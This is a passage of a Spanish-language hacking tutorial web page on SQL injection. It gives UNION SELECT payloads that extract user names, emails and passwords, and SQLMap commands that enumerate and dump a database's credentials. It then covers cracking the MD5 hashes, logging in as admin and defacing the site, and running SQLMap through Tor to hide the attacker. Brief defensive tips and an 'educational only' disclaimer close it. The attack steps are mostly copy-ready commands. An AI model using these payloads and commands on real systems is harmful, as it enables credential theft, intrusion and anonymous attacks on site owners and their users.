+<p>Utilizamos la función <code>group_concat(column_name)</code> para concatenar los nombres de todas las columnas dentro de la tabla "usuarios". Además, añadimos una condición con <code>where table_name="usuarios"</code> para asegurarnos de que solo estamos obteniendo las columnas de la tabla específica que nos interesa.</p>
+<p>Después de ejecutar esto en una página web vulnerable, supongamos que obtenemos como resultado las siguientes columnas: "id", "name", "email", "phone" y "passwd". Estas son las columnas específicas de la tabla "usuarios". Generalmente, estas columnas contienen información como identificación, nombre de usuario, dirección de correo electrónico, número de teléfono y contraseña.</p>
+<p>Lo siguiente que haremos es mostrar el contenido de las columnas "id", "name", "phone" y "passwd". </p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27; union select 1,2,3,4,group_concat(id,name,email,phone,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20, from users --+')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27; union select 1,2,3,4,group_concat(id,name,email,phone,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20, from users --+</pre></div>
+<p>Utilizamos <code>group_concat(id,name,email,phone,passwd)</code> para concatenar el contenido de las columnas "id", "name", "email" y "passwd" en la tabla "usuarios".</p>
+<p>Después de ejecutar esto en una página web vulnerable, imaginemos que obtenemos como resultado algo como "<code>0josejose123@correo.com1234567890passwordSecure</code>". Sin embargo, para que sea más legible, utilizamos la codificación hexadecimal y el símbolo <code>:</code>. Por ejemplo, el símbolo <code>:</code> en hexadecimal es <code>0x3a</code>, entonces ajustamos la consulta de la siguiente manera:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27; union select 1,2,3,4,group_concat(id,0x3a,name,0x3a,email,0x3a,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from users --+')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27; union select 1,2,3,4,group_concat(id,0x3a,name,0x3a,email,0x3a,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from users --+</pre></div>
+<p>El resultado ahora se presenta de forma más comprensible, por ejemplo:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('0:jose:jose123@correo.com:1234567890:passwordSecure')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> 0:jose:jose123@correo.com:1234567890:passwordSecure</pre></div>
+<p>Cada campo está separado por el símbolo <code>:</code>, facilitando la lectura y comprensión de la información extraída de las columnas de la base de datos.</p>
+                    </section>
+                    <section class="content-card" id="proceso-automatizado-sqlmap-2">
+                        <h2 class="section-title"><span class="hash">#</span> PROCESO AUTOMATIZADO | SQLMap</h2>
+                        <p>Para el siguiente escenario vamos a utilizar la herramienta de SQLMap, está nos ayudará automatiza la detección y explotación de vulnerabilidades de inyección SQL en aplicaciones web. Esta herramienta viene preinstalada en la distribución de Kali Linux.</p>
+<p><strong><em>Instalar en Debian:</em></strong></p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sudo apt-get install sqlmap')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sudo apt-get install sqlmap</pre></div>
+<p>El siguiente comando nos lista las opciones de ayuda de la herramienta:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sqlmap -h')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sqlmap -h</pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/2474a952-c806-49b3-86bd-55cd2bfad9f0', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/2474a952-c806-49b3-86bd-55cd2bfad9f0" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Para hacer uso correcto de la herramienta, se deben de respetar el orden para cada parámetro. Por ejemplo, si el parámetro <code>-u/--url</code> siempre va al final, es decir, delante de las opciones.</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sqlmap --opcion --url &quot;https://mipaginaweb.com&quot;')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sqlmap --opcion --url &quot;https://mipaginaweb.com&quot;</pre></div>
+<p>Entre las opciones que podemos resaltar importantes:</p>
+<table class="comparison-table">
+<thead>
+<tr>
+<th>PARÁMETRO</th>
+<th>DESCRIPCIÓN</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-C nombre</td>
+<td>Permite seleccionar una columna específica, facilitando la focalización en datos particulares dentro de una tabla.</td>
+</tr>
+<tr>
+<td>-T nombre</td>
+<td>Permite ingresar a la tabla seleccionada, brindando la capacidad de explorar y manipular datos dentro de esa tabla.</td>
+</tr>
+<tr>
+<td>-D nombre</td>
+<td>Permite ingresar a la base de datos seleccionada, brindando acceso para realizar consultas y acciones específicas dentro de esa base de datos.</td>
+</tr>
+<tr>
+<td>--column</td>
+<td>Extrae el número y los nombres de las columnas dentro de una tabla, proporcionando información detallada sobre la estructura de la tabla.</td>
+</tr>
+<tr>
+<td>--batch</td>
+<td>Ejecuta SQLMap en modo batch, lo que significa que realiza automáticamente las elecciones predeterminadas sin requerir interacción del usuario.</td>
+</tr>
+<tr>
+<td>--dbs</td>
+<td>Muestra el número de bases de datos presentes y proporciona los nombres de cada una, facilitando la enumeración de bases de datos.</td>
+</tr>
+<tr>
+<td>--dump</td>
+<td>Permite extraer el contenido de la base de datos, revelando información almacenada en las tablas seleccionadas.</td>
+</tr>
+<tr>
+<td>--dump-all</td>
+<td>Extrae todo el contenido disponible en la base de datos, proporcionando una copia completa de la información almacenada.</td>
+</tr>
+<tr>
+<td>--random-agent</td>
+<td>Cambia el User-Agent utilizado en las consultas para proporcionar anonimato y evitar la detección por patrones de tráfico.</td>
+</tr>
+<tr>
+<td>--proxy=proxy</td>
+<td>Permite la conexión a la página objetivo a través de un proxy, aumentando la privacidad y dificultando la identificación del atacante.</td>
+</tr>
+<tr>
+<td>-p parametro</td>
+<td>Determina el parámetro en la URL de la aplicación web para analizar, identificando el punto de entrada para posibles inyecciones SQL.4</td>
+</tr>
+<tr>
+<td>--level=1-5</td>
+<td>Modifica el nivel de agresividad del escaneo de inyección SQL, siendo 1 el valor predeterminado y 5 el más intrusivo.</td>
+</tr>
+<tr>
+<td>--risk=1-3</td>
+<td>Ajusta el nivel de agresividad del escaneo y afecta el ruido generado, con 1 como valor predeterminado.</td>
+</tr>
+<tr>
+<td>--current-user</td>
+<td>Extrae el nombre de usuario con el que se interactúa actualmente en la base de datos, proporcionando información sobre la sesión actual.</td>
+</tr>
+<tr>
+<td>--current-db</td>
+<td>Obtiene el nombre de la base de datos actual, revelando detalles sobre la estructura del entorno de la base de datos.</td>
+</tr>
+</tbody>
+</table>
+<p>El siguiente comando muestra un ejemplo sencillo para listar todas las bases de datos presentes. Recomiendo colocar dos comillas simples al inicio y final de la URL para evitar errores de caracteres en el parámetro.</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sqlmap --dbs --batch --url \&#x27;http://192.168.25.131/cat.php?id=1\&#x27; ')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sqlmap --dbs --batch --url &#x27;http://192.168.25.131/cat.php?id=1&#x27; </pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/cd9668dc-90ba-40c2-a39f-e54b35efc66a', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/cd9668dc-90ba-40c2-a39f-e54b35efc66a" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/738c712e-0965-477f-a888-0a1e4575a516', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/738c712e-0965-477f-a888-0a1e4575a516" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>En la imagen anterior podemos observar que la web tiene una vulnerabilidad de SQLi. Al explotarla con la herramienta nos lista dos bases de datos, una se llama <code>information_schema</code> y la otra <code>photoblog</code>. La primera base de datos (<code>information_schema</code>) proporciona información sobre la propia base datos: metadatos sobre tablas, columnas, restricciones y demás. </p>
+<p><strong>Tablas y Columnas:</strong></p>
+<p><em>TABLES (TABLAS):</em> Información sobre las tablas en la base de datos.
+<em>COLUMNS (COLUMNAS)</em>: Información sobre las columnas en las tablas.</p>
+<p><strong>Restricciones:</strong></p>
+<p><em>KEY_COLUMN_USAGE (USO_DE_COLUMNAS_CLAVE)</em>: Información sobre las columnas incluidas en restricciones de clave.
+<em>REFERENTIAL_CONSTRAINTS (RESTRICCIONES_REFERENCIALES)</em>: Información sobre restricciones de clave externa.
+<em>CHECK_CONSTRAINTS (RESTRICCIONES_DE_VERIFICACIÓN)</em>: Información sobre restricciones de verificación.</p>
+<p>Luego lo que haremos será extraer las tablas de la base de datos llamada <code>photoblog</code>:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sqlmap -D photoblog --tables --batch --url \&#x27;http://192.168.25.131/cat.php?id=1\&#x27; ')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sqlmap -D photoblog --tables --batch --url &#x27;http://192.168.25.131/cat.php?id=1&#x27; </pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/3118f038-5158-4cf0-9b0b-c346fc613956', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/3118f038-5158-4cf0-9b0b-c346fc613956" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Como resultado nos lista tres tipos de tablas: <code>categories</code>, <code>pictures</code>, <code>users</code>. El que nos importa siempre va hacer los que se llamen "users", "passwords", "email", "phone", "id", etc. Extraemos las columas de los usuarios con:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sqlmap -D photoblog -T users --columns --batch --url \&#x27;http://192.168.25.131/cat.php?id=1\&#x27; ')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sqlmap -D photoblog -T users --columns --batch --url &#x27;http://192.168.25.131/cat.php?id=1&#x27; </pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/19ebf877-863d-4b00-9acd-2e9c7a440ee4', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/19ebf877-863d-4b00-9acd-2e9c7a440ee4" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Disponemos de tres columnas destinadas a la extracción de su contenido (id,login,password), cada una de las cuales alberga información confidencial proveniente de la base de datos. Para ello, utilizamos el siguiente parámetro para extraer dicho contenido (recuerda usar coma si deseas mostrar más de una columna):</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sqlmap -D photoblog -T users -C id,login,password --dump --batch --url \&#x27;http://192.168.25.131/cat.php?id=1\&#x27; ')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sqlmap -D photoblog -T users -C id,login,password --dump --batch --url &#x27;http://192.168.25.131/cat.php?id=1&#x27; </pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/b6d124bc-f3c1-4229-a301-88f776d8d4b9', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/b6d124bc-f3c1-4229-a301-88f776d8d4b9" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Las bases de datos suelen estar cifradas con un tipo de hash que transforma los datos de manera irreversible. Este proceso asegura la integridad y seguridad de la información almacenada, incluso pequeños cambios en los datos originales generan un hash completamente diferente. Aquí la herramienta tratará de identificar el tipo de hash (MD5 en este caso) y romper el hash (cracking) mediante ataque de diccionario:</p>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/56b35de5-e770-455e-97d8-041dd77cbb5e', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/56b35de5-e770-455e-97d8-041dd77cbb5e" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Si copiamos el hash y lo pegamos en una página de cracking online (como <a href="https://crackstation.net/" target="_blank" class="external-link">crackstation.net</a>), verificamos que efectivamente el resultado es el mismo.</p>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/6b0dc90b-40e3-4a87-8a57-e123dc410710', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/6b0dc90b-40e3-4a87-8a57-e123dc410710" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Con las credenciales de administradores ya podemos logearnos en el servidor, he incluso, hacer un defacing completo.</p>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/2bb1e937-4064-4524-9c89-13fd5f93bd48', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/2bb1e937-4064-4524-9c89-13fd5f93bd48" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure>
+<figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/d69c1e3f-dca6-4128-901a-c8ff39fc7acb', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/d69c1e3f-dca6-4128-901a-c8ff39fc7acb" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure>
+<figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/b99c8b62-9b28-45ef-a3df-1a3a377c5f63', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/b99c8b62-9b28-45ef-a3df-1a3a377c5f63" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Ahora les enseñare a utilizar esta herramienta bajo Tor para que ustedes como atacantes puedan auditar una base de datos de manera anónima. Lo primero es encender el servicio de Tor:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sudo service tor start &amp;&amp; sudo service tor status')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sudo service tor start &amp;&amp; sudo service tor status</pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/fa8ce95e-d09e-4fdb-ae70-1a48980d9947', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/fa8ce95e-d09e-4fdb-ae70-1a48980d9947" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Por último ejecutamos el siguiente comando:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('sqlmap --tor --tor-type=SOCKS5 --tor-port 9050 --check-tor  --dbs --batch --url \&#x27;http://192.168.25.131/cat.php?id=1\&#x27;')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> sqlmap --tor --tor-type=SOCKS5 --tor-port 9050 --check-tor  --dbs --batch --url &#x27;http://192.168.25.131/cat.php?id=1&#x27;</pre></div>
+                    </section>
+                    <section class="content-card" id="escaner-de-sqli-scanqli-3">
+                        <h2 class="section-title"><span class="hash">#</span> Escáner de SQLi | ScanQLi</h2>
+                        <p>La herramienta ScanQLi es un simple escáner de inyección SQL capaz de detectar parámetros vulnerables en la URL. <strong>NO</strong> las explota, solo detecta.</p>
+<p><strong><em>Instalar en Debian:</em></strong></p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('&gt; git clone https://github.com/bambish/ScanQLi\n\n&gt; cd ScanQLi\n\n&gt; pip3 install -r requeriments.txt\n\n&gt; python3 scanqli.py --help')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> &gt; git clone https://github.com/bambish/ScanQLi
+
+&gt; cd ScanQLi
+
+&gt; pip3 install -r requeriments.txt
+
+&gt; python3 scanqli.py --help</pre></div>
+<table class="comparison-table">
+<thead>
+<tr>
+<th>PARÁMETRO</th>
+<th>DESCRIPCIÓN</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-u / --url</td>
+<td>Especificar la URL</td>
+</tr>
+<tr>
+<td>-r / --recursive</td>
+<td>El escaneo seguirá cada enlace hipertexto (href) presente en las página web analizada</td>
+</tr>
+<tr>
+<td>-o / --output</td>
+<td>Escribe y guarda los registros en un fichero de texto</td>
+</tr>
+</tbody>
+</table>
+<p>Aquí un ejemplo práctico:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('python3 scanqli.py -u http://192.168.25.131/ -r -o logs.txt')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> python3 scanqli.py -u http://192.168.25.131/ -r -o logs.txt</pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/eaa8596e-109d-4d2c-9e38-b6d005b43cc2', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/eaa8596e-109d-4d2c-9e38-b6d005b43cc2" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+                    </section>
+                    <section class="content-card" id="tips-de-seguridad-frente-a-este-ataque-4">
+                        <h2 class="section-title"><span class="hash">#</span> TIPS DE SEGURIDAD FRENTE A ESTE ATAQUE</h2>
+                        <p>Las contramedidas para prevenir ataques de inyección SQL son técnicas, algunas de ellas son:</p>
+<p><strong>Mediante un Firewall de Aplicaciones Web (WAF)</strong>: El WAF se caracteriza por detectar y bloquear este tipo de ataques mediante la inspección del tráfico HTTP en busca de patrones maliciosos.</p>
+<p><strong>Reducir Privilegios de Usuario en DB</strong>: Si bien no deja de ser vulnerables, el impacto que genere en la base de datos será mucho menor.</p>
+<p><strong>Usar Listas Blancas</strong>: Estas listas permiten ciertos valores o patrones de entrada que permite las consultas de SQL en la aplicación. </p>
+<p><strong>Validar y Limpiar la entrada del usuario</strong>: La entrada del usuario debe coincidir con el tipo de dato esperado, para comprobar se utiliza funciones de validación como una cadena alfanpumerica (si es un número), una dirección de correo electrónico. Establecer la longitud de la entrada es una buena medida para evitar desbordamiento y que no exceda el tamaño permitido. </p>
+<p><strong>Escape de Caracteres Especiales</strong>: En lenguajes como PHP, se suele utilizar la función "<strong><em>mysqli_real_escape_string</em></strong>" para escapar los caracteres especiales. Habitualmente son caracteres como  <code>' " \n \r</code> que son reservados por parte de MySQL.</p>
+                    </section>
+                    <section class="content-card" id="responsabilidad-final">
+                        <div class="warning-box">
+                            <i class="fas fa-triangle-exclamation" style="color: var(--accent-red); margin-right: 1rem;"></i>
+                            <strong>Advertencia:</strong> Todo el contenido de este artículo es estrictamente educativo.
+                            No nos hacemos responsables del mal uso de esta herramienta o información. Practica únicamente
+                            en entornos controlados y con autorización.
+                        </div>
+                    </section>
+                </article>
+            </main>
+
+            <aside class="sidebar">
+                <div class="profile-card">
+                    <div class="avatar">
+                        <img src="https://avatars.githubusercontent.com/u/75953873?v=4" alt="R3LI4NT Avatar"
+                             style="width: 100%; height: 100%; border-radius: 30px; object-fit: cover;" loading="lazy">
+                    </div>
+                    <h3 class="profile-name">R3LI4NT</h3>
+                    <p class="profile-bio">Pentester · Malware Developer</p>
+                    <div style="display: flex; justify-content: center; gap: 2rem;">
+                        <div><div class="stat-number">50</div><div class="stat-label">Artículos</div></div>
+                        <div><div class="stat-number">3</div><div class="stat-label">Categorías</div></div>
+                    </div>
+                </div>
+
+                <div class="sidebar-section">
+                    <div class="section-title"><i class="fas fa-list"></i><span>EN ESTE ARTÍCULO</span></div>
+                    <div class="category-nav" id="sidebarToc"></div>
+                </div>
+
+                <div class="sidebar-section">
+                    <div class="section-title"><i class="fas fa-folder"></i><span>CATEGORÍAS</span></div>
+                    <div class="category-nav">
+                        <a href="../../index.html#ciberseguridad" class="nav-link"><i class="fas fa-lock" style="color: #00ff9d;"></i><span>Ciberseguridad</span></a>
+                        <a href="../../index.html#hacking" class="nav-link"><i class="fas fa-skull" style="color: #ff3b3b;"></i><span>Hacking</span></a>
+                        <a href="../../index.html#seguridad" class="nav-link"><i class="fas fa-shield-halved" style="color: #3b7bff;"></i><span>Seguridad</span></a>
+                    </div>
+                </div>
+
+                <div class="sidebar-section">
+                    <a href="https://github.com/R3LI4NT/articulos" target="_blank" style="text-decoration: none;">
+                        <div style="background: linear-gradient(135deg, #00ff9d, #7000ff); padding: 1.5rem; border-radius: 20px; text-align: center; color: white;">
+                            <i class="fab fa-github" style="font-size: 2rem; margin-bottom: 0.5rem;"></i>
+                            <div style="font-weight: 600;">github.com/R3LI4NT/articulos</div>
+                            <div style="font-size: 0.8rem; opacity: 0.9;">Ver repositorio →</div>
+                        </div>
+                    </a>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <footer class="footer-modern">
+        <div class="container">
+            <div class="footer-grid">
+                <div>
+                    <div class="footer-logo">R3LI4NT_</div>
+                    <p class="footer-tagline">Conocimiento es poder, pero poder compartido es revolución.</p>
+                    <div class="social-links">
+                        <a href="https://github.com/R3LI4NT" class="social-link"><i class="fab fa-github"></i></a>
+                        <a href="#" class="social-link" id="toxLink"><i class="fa-brands fa-expeditedssl"></i></a>
+                        <a href="#" class="social-link" id="emailLink"><i class="fas fa-envelope"></i></a>
+                    </div>
+                </div>
+                <div class="footer-links">
+                    <h4>Explorar</h4>
+                    <ul>
+                        <li><a href="../../index.html#ciberseguridad">Ciberseguridad</a></li>
+                        <li><a href="../../index.html#hacking">Hacking</a></li>
+                        <li><a href="../../index.html#seguridad">Seguridad</a></li>
+                        <li><a href="../../index.html">Todos los artículos</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h4>Recursos</h4>
+                    <ul>
+                        <li><a href="https://github.com/R3LI4NT/articulos" target="_blank">GitHub</a></li>
+                        <li><a href="https://r3li4nt.github.io/" target="_blank">Currículum Vitae</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h4>Legal</h4>
+                    <ul><li><a href="#" id="responsabilidadLink">Responsabilidad</a></li></ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>© 2026 R3LI4NT · Todos los derechos reservados.</p>
+                <div class="matrix-code">{ 0x52, 0x33, 0x4c, 0x49, 0x34, 0x4e, 0x54 }</div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="toxModal" class="modal">
+        <div class="modal-content"><span class="modal-close">&times;</span>
+            <div class="modal-card"><div class="modal-icon"><i class="fa-brands fa-expeditedssl"></i></div>
+                <h2 class="modal-title">Tox ID</h2>
+                <div class="modal-info"><span class="modal-label">Tox ID:</span></div>
+                <div class="modal-complete"><code class="modal-code" style="font-size: 0.8rem; word-break: break-all;">08F21D19C314DB89700317A932C72EB26035AE002C34419E851730D751C579310AEB06CF4426</code></div>
+                <button class="modal-copy-btn" onclick="copyToClipboard('08F21D19C314DB89700317A932C72EB26035AE002C34419E851730D751C579310AEB06CF4426')"><i class="fas fa-copy"></i> Copiar Tox ID</button>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-top: 1rem;"><i class="fas fa-info-circle"></i> Tox para comunicación segura</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="emailModal" class="modal">
+        <div class="modal-content"><span class="modal-close">&times;</span>
+            <div class="modal-card"><div class="modal-icon"><i class="fas fa-envelope"></i></div>
+                <h2 class="modal-title">Contacto</h2>
+                <div class="modal-info"><span class="modal-label">Email:</span><span class="modal-value">r3li4nt.contact</span></div>
+                <div class="modal-info"><span class="modal-label">Dominio:</span><span class="modal-value">keemail.me</span></div>
+                <div class="modal-complete"><code class="modal-code">r3li4nt.contact@keemail.me</code></div>
+                <button class="modal-copy-btn" onclick="copyToClipboard('r3li4nt.contact@keemail.me')"><i class="fas fa-copy"></i> Copiar</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="responsabilidadModal" class="modal">
+        <div class="modal-content"><span class="modal-close">&times;</span>
+            <div class="modal-card"><div class="modal-icon"><i class="fas fa-gavel"></i></div>
+                <h2 class="modal-title">Responsabilidad</h2>
+                <div class="modal-info" style="text-align: center; margin: 2rem 0;"><span class="modal-label" style="font-size: 1.2rem;">⚠️ AVISO IMPORTANTE ⚠️</span></div>
+                <div class="modal-complete" style="margin: 1.5rem 0;"><p style="color: var(--text-primary); font-size: 1.1rem; line-height: 1.6; text-align: center;">Todo lo que se enseñe en estos artículos es con fines educativos</p></div>
+                <button class="modal-copy-btn" onclick="closeAllModals()"><i class="fas fa-check"></i> Entendido</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="imageModal">
+        <span class="modal-close" onclick="closeImageModal()">&times;</span>
+        <img class="modal-content" id="modalImage" alt="Imagen ampliada">
+        <div class="modal-caption" id="modalCaption"></div>
+    </div>
+
+    <script src="../js/script.js"></script>
+    <script>
+        function openImageModal(src, caption) {
+            const modal = document.getElementById('imageModal');
+            document.getElementById('modalImage').src = src;
+            document.getElementById('modalCaption').innerHTML = caption;
+            modal.style.display = "flex";
+            document.body.style.overflow = 'hidden';
+        }
+        function closeImageModal() {
+            document.getElementById('imageModal').style.display = "none";
+            document.body.style.overflow = 'auto';
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+            const headings = document.querySelectorAll('article .content-card h2');
+            const sidebarToc = document.getElementById('sidebarToc');
+            if (headings.length && sidebarToc) {
+                sidebarToc.innerHTML = '';
+                headings.forEach((heading, index) => {
+                    const id = heading.textContent.toLowerCase().replace(/[^\w\s]/g, '').replace(/\s+/g, '-').replace(/^-+|-+$/g, '');
+                    heading.id = id || `section-${index}`;
+                    const link = document.createElement('a');
+                    link.href = `#${heading.id}`;
+                    link.className = 'nav-link';
+                    link.innerHTML = `<i class="fas fa-chevron-right"></i><span>${heading.textContent.replace('#', '').trim()}</span>`;
+                    sidebarToc.appendChild(link);
+                });
+                document.querySelectorAll('#sidebarToc .nav-link').forEach(link => {
+                    link.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        const t = document.querySelector(this.getAttribute('href'));
+                        if (t) t.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    });
+                });
+                window.addEventListener('scroll', function() {
+                    let current = '';
+                    const scrollPos = window.scrollY + 120;
+                    headings.forEach(heading => {
+                        const s = heading.closest('.content-card');
+                        if (s && scrollPos >= s.offsetTop && scrollPos < s.offsetTop + s.offsetHeight) current = heading.id;
+                    });
+                    document.querySelectorAll('#sidebarToc .nav-link').forEach(link => {
+                        link.classList.toggle('active', link.getAttribute('href') === `#${current}`);
+                    });
+                });
+            }
+            const bind = (id, modal) => { const el = document.getElementById(id); if (el) el.addEventListener('click', e => { e.preventDefault(); document.getElementById(modal).style.display = 'flex'; }); };
+            bind('toxLink', 'toxModal'); bind('emailLink', 'emailModal'); bind('responsabilidadLink', 'responsabilidadModal');
+            document.querySelectorAll('.modal-close').forEach(btn => btn.addEventListener('click', closeAllModals));
+            window.addEventListener('click', e => { if (e.target.classList.contains('modal')) closeAllModals(); });
+            document.addEventListener('keydown', e => { if (e.key === 'Escape') closeAllModals(); });
+        });
+        function copyCommand(cmd) { navigator.clipboard.writeText(cmd).then(() => alert('Comando copiado al portapapeles'), () => alert('Error al copiar')); }
+        function copyToClipboard(t) { navigator.clipboard.writeText(t).then(() => alert('Copiado al portapapeles'), () => alert('Error al copiar')); }
+        function closeAllModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); document.getElementById('imageModal').style.display = 'none'; document.body.style.overflow = 'auto'; }
+        window.openImageModal = openImageModal; window.closeImageModal = closeImageModal;
+    </script>
+</body>
+</html>
